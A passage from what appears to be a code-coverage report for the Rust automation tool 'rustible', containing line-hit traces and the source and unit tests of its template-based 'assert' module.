}\n}\n","traces":[{"line":22,"address":[25823467,25822768,25823461],"length":1,"stats":{"Line":1}},{"line":23,"address":[25822897,25822795],"length":1,"stats":{"Line":2}},{"line":24,"address":[25822913],"length":1,"stats":{"Line":1}},{"line":25,"address":[25823026],"length":1,"stats":{"Line":1}},{"line":26,"address":[25823139,25823209],"length":1,"stats":{"Line":2}},{"line":27,"address":[25823177,25823231],"length":1,"stats":{"Line":2}},{"line":40,"address":[25823488,25824283,25824376],"length":1,"stats":{"Line":0}},{"line":41,"address":[25823518],"length":1,"stats":{"Line":0}},{"line":43,"address":[25823581,25824025],"length":1,"stats":{"Line":0}},{"line":44,"address":[25823641],"length":1,"stats":{"Line":0}},{"line":45,"address":[25823752,25823649,25823831,25823736],"length":1,"stats":{"Line":0}},{"line":47,"address":[25823653],"length":1,"stats":{"Line":0}},{"line":48,"address":[31198336,31198350],"length":1,"stats":{"Line":0}},{"line":49,"address":[25823865,25823904],"length":1,"stats":{"Line":0}},{"line":52,"address":[25823595,25824250,25824035],"length":1,"stats":{"Line":0}},{"line":53,"address":[25824043,25824203],"length":1,"stats":{"Line":0}},{"line":56,"address":[25824127],"length":1,"stats":{"Line":0}},{"line":60,"address":[25824848],"length":1,"stats":{"Line":0}},{"line":65,"address":[31207467],"length":1,"stats":{"Line":0}},{"line":67,"address":[31207364],"length":1,"stats":{"Line":0}},{"line":69,"address":[25982781],"length":1,"stats":{"Line":0}},{"line":70,"address":[31208350],"length":1,"stats":{"Line":0}},{"line":71,"address":[31208319],"length":1,"stats":{"Line":0}},{"line":76,"address":[25824960],"length":1,"stats":{"Line":0}},{"line":81,"address":[31209164],"length":1,"stats":{"Line":0}},{"line":83,"address":[31209058],"length":1,"stats":{"Line":0}},{"line":85,"address":[25985725],"length":1,"stats":{"Line":0}},{"line":86,"address":[31210164],"length":1,"stats":{"Line":0}},{"line":87,"address":[31210345,31210270],"length":1,"stats":{"Line":0}},{"line":88,"address":[31210466,31210646,31210407],"length":1,"stats":{"Line":0}},{"line":89,"address":[31210648],"length":1,"stats":{"Line":0}},{"line":91,"address":[31210476],"length":1,"stats":{"Line":0}},{"line":94,"address":[31210075],"length":1,"stats":{"Line":0}},{"line":99,"address":[25824416],"length":1,"stats":{"Line":0}},{"line":103,"address":[31198451],"length":1,"stats":{"Line":0}},{"line":104,"address":[31199648,31199645,31199159,31198597,31198718,31198818,31198654,31199883],"length":1,"stats":{"Line":0}},{"line":105,"address":[31199730,31199670],"length":1,"stats":{"Line":0}},{"line":108,"address":[31199244],"length":1,"stats":{"Line":0}},{"line":109,"address":[31199254,31199365],"length":1,"stats":{"Line":0}},{"line":115,"address":[31199299],"length":1,"stats":{"Line":0}},{"line":119,"address":[25824624],"length":1,"stats":{"Line":0}},{"line":124,"address":[31202542,31204451,31204416,31202676],"length":1,"stats":{"Line":0}},{"line":125,"address":[31202862],"length":1,"stats":{"Line":0}},{"line":127,"address":[31202733,31202822],"length":1,"stats":{"Line":0}},{"line":130,"address":[25974301],"length":1,"stats":{"Line":0}},{"line":131,"address":[31204502,31204562],"length":1,"stats":{"Line":0}},{"line":134,"address":[31203801],"length":1,"stats":{"Line":0}},{"line":135,"address":[31203811,31203922],"length":1,"stats":{"Line":0}},{"line":141,"address":[31203856],"length":1,"stats":{"Line":0}},{"line":145,"address":[25824512],"length":1,"stats":{"Line":0}},{"line":150,"address":[31200126,31200260,31202035,31202000],"length":1,"stats":{"Line":0}},{"line":151,"address":[31200446],"length":1,"stats":{"Line":0}},{"line":153,"address":[31200406,31200317],"length":1,"stats":{"Line":0}},{"line":156,"address":[25969245],"length":1,"stats":{"Line":0}},{"line":157,"address":[31202146,31202086],"length":1,"stats":{"Line":0}},{"line":160,"address":[31201385],"length":1,"stats":{"Line":0}},{"line":161,"address":[31201506,31201395],"length":1,"stats":{"Line":0}},{"line":167,"address":[31201440],"length":1,"stats":{"Line":0}},{"line":171,"address":[25824736],"length":1,"stats":{"Line":0}},{"line":176,"address":[31205092,31206867,31206832,31204958],"length":1,"stats":{"Line":0}},{"line":177,"address":[31205278],"length":1,"stats":{"Line":0}},{"line":179,"address":[31205149,31205238],"length":1,"stats":{"Line":0}},{"line":182,"address":[25974589],"length":1,"stats":{"Line":0}},{"line":183,"address":[31206918,31206978],"length":1,"stats":{"Line":0}},{"line":186,"address":[31206217],"length":1,"stats":{"Line":0}},{"line":187,"address":[31206227,31206338],"length":1,"stats":{"Line":0}},{"line":193,"address":[31206272],"length":1,"stats":{"Line":0}},{"line":198,"address":[25816704],"length":1,"stats":{"Line":1}},{"line":202,"address":[25813312],"length":1,"stats":{"Line":0}},{"line":206,"address":[25813344],"length":1,"stats":{"Line":1}},{"line":210,"address":[25813392],"length":1,"stats":{"Line":1}},{"line":215,"address":[25813360],"length":1,"stats":{"Line":1}},{"line":219,"address":[25817168,25819007,25818963],"length":1,"stats":{"Line":0}},{"line":225,"address":[25817227,25817555],"length":1,"stats":{"Line":0}},{"line":226,"address":[25817516],"length":1,"stats":{"Line":0}},{"line":228,"address":[25817647,25819020,25817567],"length":1,"stats":{"Line":0}},{"line":231,"address":[25818149,25819005,25818068],"length":1,"stats":{"Line":0}},{"line":233,"address":[25818206],"length":1,"stats":{"Line":0}},{"line":234,"address":[25818323,25818244,25818990],"length":1,"stats":{"Line":0}},{"line":235,"address":[25818478],"length":1,"stats":{"Line":0}},{"line":238,"address":[25818657,25818969,25818521],"length":1,"stats":{"Line":0}},{"line":239,"address":[31186591],"length":1,"stats":{"Line":0}},{"line":241,"address":[31186558],"length":1,"stats":{"Line":0}},{"line":246,"address":[25818715],"length":1,"stats":{"Line":0}},{"line":249,"address":[31186848,31186640],"length":1,"stats":{"Line":0}},{"line":250,"address":[31187068,31187153,31186957,31186662,31187174,31187285,31186880,31187111,31187549,31187132,31188351],"length":1,"stats":{"Line":0}},{"line":252,"address":[31187229,31187921,31187006],"length":1,"stats":{"Line":0}},{"line":253,"address":[31187250,31188292,31187583,31187367,31187098],"length":1,"stats":{"Line":0}},{"line":257,"address":[31187203],"length":1,"stats":{"Line":0}},{"line":258,"address":[31187934],"length":1,"stats":{"Line":0}},{"line":259,"address":[31188005],"length":1,"stats":{"Line":0}},{"line":260,"address":[31188073],"length":1,"stats":{"Line":0}},{"line":263,"address":[31189349,31188263,31188141,31188241],"length":1,"stats":{"Line":0}},{"line":264,"address":[31192369,31192301,31188700,31192339,31188562,31188624],"length":1,"stats":{"Line":0}},{"line":265,"address":[31189411],"length":1,"stats":{"Line":0}},{"line":266,"address":[31192126],"length":1,"stats":{"Line":0}},{"line":267,"address":[31192196],"length":1,"stats":{"Line":0}},{"line":269,"address":[31192364,31188395,31187119,31192324,31188594,31188668,31188365],"length":1,"stats":{"Line":0}},{"line":271,"address":[31188762],"length":1,"stats":{"Line":0}},{"line":273,"address":[31188809],"length":1,"stats":{"Line":0}},{"line":274,"address":[31188912,31188993],"length":1,"stats":{"Line":0}},{"line":276,"address":[31188961,31188863],"length":1,"stats":{"Line":0}},{"line":280,"address":[31188822],"length":1,"stats":{"Line":0}},{"line":281,"address":[31189074,31189155],"length":1,"stats":{"Line":0}},{"line":283,"address":[31189025,31189123],"length":1,"stats":{"Line":0}},{"line":287,"address":[31188842],"length":1,"stats":{"Line":0}},{"line":288,"address":[31189236,31189317],"length":1,"stats":{"Line":0}},{"line":290,"address":[31189285,31189187],"length":1,"stats":{"Line":0}},{"line":297,"address":[31189449],"length":1,"stats":{"Line":0}},{"line":298,"address":[31189504,31190010,31190042],"length":1,"stats":{"Line":0}},{"line":299,"address":[31191842],"length":1,"stats":{"Line":0}},{"line":301,"address":[31191802,31190128],"length":1,"stats":{"Line":0}},{"line":305,"address":[31190024],"length":1,"stats":{"Line":0}},{"line":306,"address":[31190170,31190243],"length":1,"stats":{"Line":0}},{"line":307,"address":[31190337,31190257],"length":1,"stats":{"Line":0}},{"line":309,"address":[31190702,31190296],"length":1,"stats":{"Line":0}},{"line":310,"address":[31190716,31190796],"length":1,"stats":{"Line":0}},{"line":312,"address":[31191161,31190755],"length":1,"stats":{"Line":0}},{"line":313,"address":[31191256,31191175],"length":1,"stats":{"Line":0}},{"line":316,"address":[31191214,31191630],"length":1,"stats":{"Line":0}},{"line":320,"address":[31189470],"length":1,"stats":{"Line":0}},{"line":321,"address":[31189478],"length":1,"stats":{"Line":0}},{"line":323,"address":[31189537,31189617],"length":1,"stats":{"Line":0}},{"line":324,"address":[31192611,31193551,31192549,31189945,31189907,31192687],"length":1,"stats":{"Line":0}},{"line":325,"address":[31189631],"length":1,"stats":{"Line":0}},{"line":326,"address":[31189731],"length":1,"stats":{"Line":0}},{"line":327,"address":[31189802],"length":1,"stats":{"Line":0}},{"line":329,"address":[26107690],"length":1,"stats":{"Line":0}},{"line":330,"address":[31192728],"length":1,"stats":{"Line":0}},{"line":331,"address":[31192736],"length":1,"stats":{"Line":0}},{"line":332,"address":[31193330,31192901,31193404],"length":1,"stats":{"Line":0}},{"line":336,"address":[31189666,31192944],"length":1,"stats":{"Line":0}},{"line":337,"address":[31193895,31193272,31193757,31193234,31193819,31194768],"length":1,"stats":{"Line":0}},{"line":338,"address":[31192958],"length":1,"stats":{"Line":0}},{"line":339,"address":[31193058],"length":1,"stats":{"Line":0}},{"line":340,"address":[31193129],"length":1,"stats":{"Line":0}},{"line":342,"address":[31193863,31193789,31193257,31187161,31193305,31193590],"length":1,"stats":{"Line":0}},{"line":343,"address":[31193936],"length":1,"stats":{"Line":0}},{"line":344,"address":[31193944],"length":1,"stats":{"Line":0}},{"line":345,"address":[31194109,31194621,31194547],"length":1,"stats":{"Line":0}},{"line":349,"address":[31192993,31194152],"length":1,"stats":{"Line":0}},{"line":350,"address":[31194948,31195086,31195010,31198143,31194451,31194489],"length":1,"stats":{"Line":0}},{"line":351,"address":[31194166],"length":1,"stats":{"Line":0}},{"line":352,"address":[31194275],"length":1,"stats":{"Line":0}},{"line":353,"address":[31194346],"length":1,"stats":{"Line":0}},{"line":355,"address":[31187182,31194980,31194474,31194522,31195054,31194781],"length":1,"stats":{"Line":0}},{"line":356,"address":[31195127],"length":1,"stats":{"Line":0}},{"line":357,"address":[31195135],"length":1,"stats":{"Line":0}},{"line":358,"address":[31195300,31197996,31197922],"length":1,"stats":{"Line":0}},{"line":362,"address":[31194201,31195352],"length":1,"stats":{"Line":0}},{"line":363,"address":[31195466,31197775,31197701],"length":1,"stats":{"Line":0}},{"line":366,"address":[31195502],"length":1,"stats":{"Line":0}},{"line":367,"address":[31195551],"length":1,"stats":{"Line":0}},{"line":368,"address":[31195869,31195942],"length":1,"stats":{"Line":0}},{"line":369,"address":[31195956,31196033],"length":1,"stats":{"Line":0}},{"line":371,"address":[31195995,31196383],"length":1,"stats":{"Line":0}},{"line":372,"address":[31196397,31196462],"length":1,"stats":{"Line":0}},{"line":374,"address":[31196812,31196430],"length":1,"stats":{"Line":0}},{"line":375,"address":[31196826,31196889],"length":1,"stats":{"Line":0}},{"line":378,"address":[31197297,31197477,31196859,31197564],"length":1,"stats":{"Line":0}},{"line":379,"address":[31197380,31197235,31197485,31197691,31197402],"length":1,"stats":{"Line":0}},{"line":381,"address":[31195788],"length":1,"stats":{"Line":0}},{"line":382,"address":[31195612,31195729,31195512],"length":1,"stats":{"Line":0}},{"line":383,"address":[31195737,31195657,31195851,31195635,31195561],"length":1,"stats":{"Line":0}},{"line":389,"address":[25818903],"length":1,"stats":{"Line":0}},{"line":392,"address":[25817136,25817142,25816736],"length":1,"stats":{"Line":0}},{"line":397,"address":[25817072],"length":1,"stats":{"Line":0}},{"line":400,"address":[25815662,25816616,25813408],"length":1,"stats":{"Line":0}},{"line":401,"address":[25813842,25813473],"length":1,"stats":{"Line":0}},{"line":402,"address":[25813794],"length":1,"stats":{"Line":0}},{"line":404,"address":[25813854,25816629,25813934],"length":1,"stats":{"Line":0}},{"line":407,"address":[25814364,25814448,25816614],"length":1,"stats":{"Line":0}},{"line":409,"address":[31180992,31181004],"length":1,"stats":{"Line":0}},{"line":410,"address":[25814543,25814622,25816593],"length":1,"stats":{"Line":0}},{"line":413,"address":[25814780],"length":1,"stats":{"Line":0}},{"line":414,"address":[25814848],"length":1,"stats":{"Line":0}},{"line":417,"address":[25814887],"length":1,"stats":{"Line":0}},{"line":418,"address":[25814906],"length":1,"stats":{"Line":0}},{"line":420,"address":[25814969,25815049],"length":1,"stats":{"Line":0}},{"line":421,"address":[25815149],"length":1,"stats":{"Line":0}},{"line":423,"address":[25815678,25816037],"length":1,"stats":{"Line":0}},{"line":424,"address":[25816172],"length":1,"stats":{"Line":0}},{"line":427,"address":[25815716],"length":1,"stats":{"Line":0}},{"line":428,"address":[25815878],"length":1,"stats":{"Line":0}},{"line":433,"address":[25815441,25815386],"length":1,"stats":{"Line":0}},{"line":434,"address":[25815195],"length":1,"stats":{"Line":0}},{"line":435,"address":[25815274,25815354],"length":1,"stats":{"Line":0}},{"line":440,"address":[25814877],"length":1,"stats":{"Line":0}},{"line":442,"address":[25816344],"length":1,"stats":{"Line":0}},{"line":443,"address":[31181102,31181171,31181243,31181499,31180805,31185482,31181040,31181214],"length":1,"stats":{"Line":0}},{"line":444,"address":[31181148],"length":1,"stats":{"Line":0}},{"line":445,"address":[31181290],"length":1,"stats":{"Line":0}},{"line":447,"address":[31181358,31184606,31181473,31181457],"length":1,"stats":{"Line":0}},{"line":448,"address":[31186060,31185767,31186136,31186442,31186001,31185805],"length":1,"stats":{"Line":0}},{"line":449,"address":[31184665],"length":1,"stats":{"Line":0}},{"line":450,"address":[31185631],"length":1,"stats":{"Line":0}},{"line":451,"address":[31185680],"length":1,"stats":{"Line":0}},{"line":453,"address":[31186104,31185790,31185840,31185827,31186033,31181201,31181533],"length":1,"stats":{"Line":0}},{"line":455,"address":[31181751,31181810,31186377,31186467,31181886,31186415],"length":1,"stats":{"Line":0}},{"line":456,"address":[31186194],"length":1,"stats":{"Line":0}},{"line":457,"address":[31186243],"length":1,"stats":{"Line":0}},{"line":458,"address":[31186292],"length":1,"stats":{"Line":0}},{"line":460,"address":[26102190],"length":1,"stats":{"Line":0}},{"line":461,"address":[31181951],"length":1,"stats":{"Line":0}},{"line":463,"address":[31181986],"length":1,"stats":{"Line":0}},{"line":465,"address":[31182034],"length":1,"stats":{"Line":0}},{"line":466,"address":[31182591,31182150],"length":1,"stats":{"Line":0}},{"line":467,"address":[31182769],"length":1,"stats":{"Line":0}},{"line":469,"address":[31182259,31182096],"length":1,"stats":{"Line":0}},{"line":470,"address":[31182394],"length":1,"stats":{"Line":0}},{"line":474,"address":[31182050],"length":1,"stats":{"Line":0}},{"line":475,"address":[31183068,31183446],"length":1,"stats":{"Line":0}},{"line":476,"address":[31183624],"length":1,"stats":{"Line":0}},{"line":478,"address":[31183014,31183133],"length":1,"stats":{"Line":0}},{"line":479,"address":[31183268],"length":1,"stats":{"Line":0}},{"line":483,"address":[31182073],"length":1,"stats":{"Line":0}},{"line":484,"address":[31183864,31184242],"length":1,"stats":{"Line":0}},{"line":485,"address":[31184420],"length":1,"stats":{"Line":0}},{"line":487,"address":[31183929,31183810],"length":1,"stats":{"Line":0}},{"line":488,"address":[31184064],"length":1,"stats":{"Line":0}},{"line":494,"address":[31185074,31185129],"length":1,"stats":{"Line":0}},{"line":495,"address":[31184703,31184806,31184902],"length":1,"stats":{"Line":0}},{"line":496,"address":[31185001,31184910],"length":1,"stats":{"Line":0}},{"line":501,"address":[25816470],"length":1,"stats":{"Line":0}},{"line":562,"address":[25822400,25822753,25822747],"length":1,"stats":{"Line":1}},{"line":564,"address":[25822459,25822484],"length":1,"stats":{"Line":2}},{"line":565,"address":[25822474],"length":1,"stats":{"Line":3}},{"line":567,"address":[25822585],"length":1,"stats":{"Line":1}},{"line":569,"address":[25822498,25822596],"length":1,"stats":{"Line":1}}],"covered":15,"coverable":229},{"path":["/","home","artur","Repositories","rustible","src","modules","assert.rs"],"content":"//! Assert module - Fail task if conditions are not met\n//!\n//! This module allows you to assert that certain conditions are true.\n//! If the conditions are not met, the task fails with an optional message.\n//! Unlike most modules, it runs entirely on the control node and does not\n//! require a connection to remote hosts.\n\nuse super::{\n    Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint, ParamExt,\n};\nuse crate::template::TemplateEngine;\nuse serde_json::Value;\nuse std::collections::HashMap;\n\n/// Module for asserting conditions are true\npub struct AssertModule;\n\nimpl AssertModule {\n    /// Evaluate a single condition string using the template engine\n    fn evaluate_condition(\n        \u0026self,\n        template_engine: \u0026TemplateEngine,\n        condition: \u0026str,\n        vars: \u0026HashMap\u003cString, Value\u003e,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        // Wrap the condition in a template expression that evaluates to a boolean\n        let template = format!(\"{{{{ {} }}}}\", condition);\n\n        let result = template_engine.render(\u0026template, vars).map_err(|e| {\n            ModuleError::TemplateError(format!(\n                \"Failed to evaluate condition '{}': {}\",\n                condition, e\n            ))\n        })?;\n\n        // Parse the result as a boolean\n        // In Jinja2, empty strings, \"False\", \"false\", \"0\" are considered false\n        let result = result.trim();\n        let is_true = !result.is_empty()\n            \u0026\u0026 result != \"False\"\n            \u0026\u0026 result != \"false\"\n            \u0026\u0026 result != \"0\"\n            \u0026\u0026 result != \"None\"\n            \u0026\u0026 result != \"none\";\n\n        Ok(is_true)\n    }\n\n    /// Evaluate all conditions and return the list of failures\n    fn evaluate_all_conditions(\n        \u0026self,\n        conditions: \u0026[String],\n        vars: \u0026HashMap\u003cString, Value\u003e,\n    ) -\u003e ModuleResult\u003cVec\u003cString\u003e\u003e {\n        let mut failed_conditions = Vec::new();\n        let template_engine = TemplateEngine::new();\n\n        for condition in conditions {\n            match self.evaluate_condition(\u0026template_engine, condition, vars) {\n                Ok(true) =\u003e {\n                    // Condition passed\n                }\n                Ok(false) =\u003e {\n                    // Condition failed\n                    failed_conditions.push(condition.clone());\n                }\n                Err(e) =\u003e {\n                    // Error evaluating condition - treat as failure\n                    failed_conditions.push(format!(\"{} (evaluation error: {})\", condition, e));\n                }\n            }\n        }\n\n        Ok(failed_conditions)\n    }\n}\n\nimpl Module for AssertModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"assert\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Assert that given expressions are true\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        // LocalLogic because this runs entirely on the control node\n        ModuleClassification::LocalLogic\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // Can run in parallel since it's just evaluating conditions\n        ParallelizationHint::FullyParallel\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"that\"]\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // 'that' parameter is required\n        if params.get(\"that\").is_none() {\n            return Err(ModuleError::MissingParameter(\n                \"'that' parameter is required\".to_string(),\n            ));\n        }\n\n        // Validate that 'that' is either a string or array\n        if let Some(that_param) = params.get(\"that\") {\n            match that_param {\n                Value::String(_) | Value::Array(_) =\u003e {}\n                _ =\u003e {\n                    return Err(ModuleError::InvalidParameter(\n                        \"'that' parameter must be a string or list of strings\".to_string(),\n                    ));\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Get the conditions to assert\n        let conditions: Vec\u003cString\u003e = match params.get(\"that\") {\n            Some(Value::String(s)) =\u003e vec![s.clone()],\n            Some(Value::Array(arr)) =\u003e {\n                let mut conds = Vec::new();\n                for item in arr {\n                    match item {\n                        Value::String(s) =\u003e conds.push(s.clone()),\n                        _ =\u003e conds.push(item.to_string()),\n                    }\n                }\n                conds\n            }\n            _ =\u003e {\n                return Err(ModuleError::MissingParameter(\n                    \"'that' parameter is required\".to_string(),\n                ));\n            }\n        };\n\n        // Get optional messages\n        let fail_msg = params.get_string(\"msg\")?;\n        let success_msg = params.get_string(\"success_msg\")?;\n        let quiet = params.get_bool_or(\"quiet\", false);\n\n        // Evaluate all conditions\n        let failed_conditions = self.evaluate_all_conditions(\u0026conditions, \u0026context.vars)?;\n\n        // Check if all conditions passed\n        if failed_conditions.is_empty() {\n            // All assertions passed\n            let message = if let Some(msg) = success_msg {\n                msg\n            } else if quiet {\n                \"All assertions passed\".to_string()\n            } else {\n                format!(\n                    \"All assertions passed (evaluated {} condition{})\",\n                    conditions.len(),\n                    if conditions.len() == 1 { \"\" } else { \"s\" }\n                )\n            };\n\n            let mut output = ModuleOutput::ok(message);\n\n            // Add evaluated conditions to output data if not quiet\n            if !quiet {\n                output.data.insert(\n                    \"evaluated_to\".to_string(),\n                    Value::Array(\n                        conditions\n                            .iter()\n                            .map(|c| Value::String(c.clone()))\n                            .collect(),\n                    ),\n                );\n            }\n\n            Ok(output)\n        } else {\n            // Some assertions failed\n            let message = if let Some(msg) = fail_msg {\n                msg\n            } else {\n                format!(\n                    \"Assertion failed: {} of {} condition{} failed\",\n                    failed_conditions.len(),\n                    conditions.len(),\n                    if conditions.len() == 1 { \"\" } else { \"s\" }\n                )\n            };\n\n            let mut output = ModuleOutput::failed(message);\n\n            // Add details about failed conditions\n            output.data.insert(\n                \"assertion\".to_string(),\n                Value::Array(\n                    conditions\n                        .iter()\n                        .map(|c| Value::String(c.clone()))\n                        .collect(),\n                ),\n            );\n            output.data.insert(\n                \"failed_conditions\".to_string(),\n                Value::Array(\n                    failed_conditions\n                        .iter()\n                        .map(|c| Value::String(c.clone()))\n                        .collect(),\n                ),\n            );\n\n            Ok(output)\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Assert module behaves the same in check mode - conditions are evaluated\n        self.execute(params, context)\n    }\n\n    fn diff(\n        \u0026self,\n        _params: \u0026ModuleParams,\n        _context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cOption\u003csuper::Diff\u003e\u003e {\n        // Assert module never produces diffs\n        Ok(None)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_assert_single_condition_pass() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"that\".to_string(), Value::String(\"true\".to_string()));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n        assert!(result.msg.contains(\"All assertions passed\"));\n    }\n\n    #[test]\n    fn test_assert_single_condition_fail() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"that\".to_string(), Value::String(\"false\".to_string()));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.status, super::super::ModuleStatus::Failed);\n        assert!(result.msg.contains(\"Assertion failed\"));\n    }\n\n    #[test]\n    fn test_assert_multiple_conditions_all_pass() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"that\".to_string(),\n            Value::Array(vec![\n                Value::String(\"true\".to_string()),\n                Value::String(\"1 == 1\".to_string()),\n                Value::String(\"'hello' == 'hello'\".to_string()),\n            ]),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n        assert!(result.msg.contains(\"All assertions passed\"));\n        assert!(result.msg.contains(\"3 conditions\"));\n    }\n\n    #[test]\n    fn test_assert_multiple_conditions_some_fail() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"that\".to_string(),\n            Value::Array(vec![\n                Value::String(\"true\".to_string()),\n                Value::String(\"false\".to_string()),\n                Value::String(\"1 == 2\".to_string()),\n            ]),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.status, super::super::ModuleStatus::Failed);\n        assert!(result.msg.contains(\"2 of 3 conditions failed\"));\n        assert!(result.data.contains_key(\"failed_conditions\"));\n    }\n\n    #[test]\n    fn test_assert_with_variables() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"that\".to_string(),\n            Value::Array(vec![\n                Value::String(\"foo == 'bar'\".to_string()),\n                Value::String(\"count \u003e 5\".to_string()),\n            ]),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\"foo\".to_string(), Value::String(\"bar\".to_string()));\n        vars.insert(\"count\".to_string(), Value::Number(10.into()));\n        let context = ModuleContext::default().with_vars(vars);\n\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n    }\n\n    #[test]\n    fn test_assert_with_custom_fail_msg() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"that\".to_string(), Value::String(\"false\".to_string()));\n        params.insert(\n            \"msg\".to_string(),\n            Value::String(\"Custom error message\".to_string()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Failed);\n        assert_eq!(result.msg, \"Custom error message\");\n    }\n\n    #[test]\n    fn test_assert_with_success_msg() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"that\".to_string(), Value::String(\"true\".to_string()));\n        params.insert(\n            \"success_msg\".to_string(),\n            Value::String(\"Everything is awesome!\".to_string()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n        assert_eq!(result.msg, \"Everything is awesome!\");\n    }\n\n    #[test]\n    fn test_assert_validation_requires_that() {\n        let module = AssertModule;\n        let params: ModuleParams = HashMap::new();\n\n        let result = module.validate_params(\u0026params);\n        assert!(result.is_err());\n        assert!(result.unwrap_err().to_string().contains(\"'that'\"));\n    }\n\n    #[test]\n    fn test_assert_check_mode_same_as_execute() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"that\".to_string(), Value::String(\"true\".to_string()));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n    }\n\n    #[test]\n    #[ignore = \"Complex Jinja2 expressions require full template engine support\"]\n    fn test_assert_with_complex_expressions() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"that\".to_string(),\n            Value::Array(vec![\n                Value::String(\"ansible_os_family == 'Debian'\".to_string()),\n                Value::String(\"ansible_distribution_version is version('20.04', '\u003e=')\".to_string()),\n            ]),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\n            \"ansible_os_family\".to_string(),\n            Value::String(\"Debian\".to_string()),\n        );\n        vars.insert(\n            \"ansible_distribution_version\".to_string(),\n            Value::String(\"22.04\".to_string()),\n        );\n        let context = ModuleContext::default().with_vars(vars);\n\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n    }\n\n    #[test]\n    fn test_assert_quiet_mode() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"that\".to_string(), Value::String(\"true\".to_string()));\n        params.insert(\"quiet\".to_string(), Value::Bool(true));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n        assert_eq!(result.msg, \"All assertions passed\");\n        assert!(!result.data.contains_key(\"evaluated_to\"));\n    }\n\n    #[test]\n    fn test_assert_with_undefined_variable() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"that\".to_string(),\n            Value::String(\"undefined_var == 'test'\".to_string()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        // Should fail because the condition can't be evaluated or evaluates to false\n        assert_eq!(result.status, super::super::ModuleStatus::Failed);\n    }\n\n    #[test]\n    fn test_assert_with_logical_operators() {\n        let module = AssertModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"that\".to_string(),\n            Value::Array(vec![\n                Value::String(\"(foo == 'bar') and (count \u003e 5)\".to_string()),\n                Value::String(\"status == 'ok' or status == 'success'\".to_string()),\n            ]),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\"foo\".to_string(), Value::String(\"bar\".to_string()));\n        vars.insert(\"count\".to_string(), Value::Number(10.into()));\n        vars.insert(\"status\".to_string(), Value::String(\"ok\".to_string()));\n        let context = ModuleContext::default().with_vars(vars);\n\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n    